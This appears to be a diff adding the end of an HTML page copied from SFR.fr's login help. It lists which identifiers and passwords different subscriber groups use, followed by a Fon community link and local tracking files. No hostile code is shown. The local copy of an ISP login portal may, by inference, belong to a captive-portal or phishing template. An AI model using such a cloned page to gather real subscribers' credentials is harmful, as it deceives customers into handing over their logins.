+                            <ul><li><span>votre mot de passe personnalisé</span></li></ul><br>
+                        <p>
+                            <strong>Vous n'arrivez pas à accéder à votre compte ?</strong><br>
+                            Vous pouvez aussi contacter votre Service
+Client au 1077 (tarif local depuis une ligne fixe en France
+métropolitaine, temps d'attente gratuit depuis une ligne neufbox).
+                        </p>
+                    </div>
+
+                    <p style="padding:0;margin:0;padding-left:30px!important"><a href="#" onclick="showInfos('p2')">Vous étiez abonné(e) Neuf, Club Internet ou AOL</a></p>
+                    <div id="p2" style="display:none">
+                        <p>
+                            <span class="rouge"><strong>Vous êtiez abonné(e) Neuf, Club Internet, ou AOL, vous êtes désormais titulaire d'un compte SFR</strong></span><br>
+                            <strong>Comment se connecter sur SFR.fr ?</strong><br><br>
+                            <span style="text-decoration:underline">votre identifiant SFR.fr</span><br>
+                        </p>
+                            <ul><li><span>votre nom d'utilisateur</span></li></ul>
+                        <p>ou</p>
+                            <ul><li><span>votre identifiant Mon Compte (9ID)</span></li></ul>
+                        <p>ou</p>
+                            <ul><li><span>l'adresse email (exemples :
+jean.dupont@neuf.fr, jean.dupont@club.fr, jean.dupont@sfr.fr) que vous
+avez choisie comme identifiant dans la rubrique Mon Compte</span></li></ul>
+                        <p>ou</p>
+                            <ul><li><span>l'adresse email (@sfr.fr) obtenue par courrier lors de la migration de votre compte chez SFR</span></li></ul>
+                        <p>ou</p>
+                            <ul><li><span>l'adresse email reçue par courrier lors de votre inscription (exemple : jean.dupont@sfr.fr)</span></li></ul>
+                        <p>ou</p>
+                            <ul><li><span>votre adresse email personnalisée si vous l'avez modifiée (exemple : j.dupont@sfr.fr)</span></li></ul>
+                        <p><span style="text-decoration:underline">votre mot de passe</span></p>
+                            <ul><li><span>le mot de passe que vous avez créé dans la rubrique Mon Compte</span></li></ul>
+                        <p>ou</p>
+                            <ul><li><span>le mot de passe obtenu par courriel lors de la migration de votre compte chez SFR</span></li></ul>
+                        <br>
+                        <p>
+                            <strong>Vous n'arrivez pas à accéder à votre compte ?</strong><br>
+                            Vous pouvez aussi contacter votre Service
+Client au 1077 (tarif local depuis une ligne fixe en France
+métropolitaine, temps d'attente gratuit depuis une ligne neufbox).
+                        </p>
+
+                    </div>
+                    <p style="padding:0;margin:0;padding-left:30px!important"><a href="#" onclick="showInfos('p3')">Vous possédez uniquement une adresse email secondaire</a></p>
+                    <div id="p3" style="display:none;">
+                        <p>
+                            <span class="rouge"><strong>Vous possédez uniquement une adresse email secondaire</strong></span><br>
+                            <strong>Comment se connecter sur SFR.fr ?</strong><br><br>
+                            <span style="text-decoration:underline">votre identifiant SFR.fr</span>
+                        </p>
+                        <ul><li><span>votre adresse email complète, créée par le titulaire du compte SFR (jean.dupont@sfr.fr)</span></li></ul>
+                        <p><span style="text-decoration:underline">votre mot de passe</span></p>
+                            <ul><li><span>le mot de passe choisi par le titulaire du compte SFR lors de la création de votre adresse email</span></li></ul>
+                        <p>ou</p>
+                            <ul><li><span>votre mot de passe personnalisé, si vous l'avez changé depuis la création de ce compte</span></li></ul><br>
+                        <p>
+                            <strong>Vous n'arrivez pas à accéder à votre compte ?</strong><br>
+                            Vous pouvez aussi contacter votre Service
+Client au 1077 (tarif local depuis une ligne fixe en France
+métropolitaine, temps d'attente gratuit depuis une ligne neufbox).
+                        </p>
+                    </div>
+                    <p style="padding:0;margin:0;padding-left:30px!important"><a href="/" target="_blank">Membre de la communauté Fon</a></p>
+            </div>
+        </div>
+        <div id="tracking"><img src="rsc/track.gif"></div>
+        <script type="text/javascript" src="rsc/track.js"></script>
+</div></body></html>
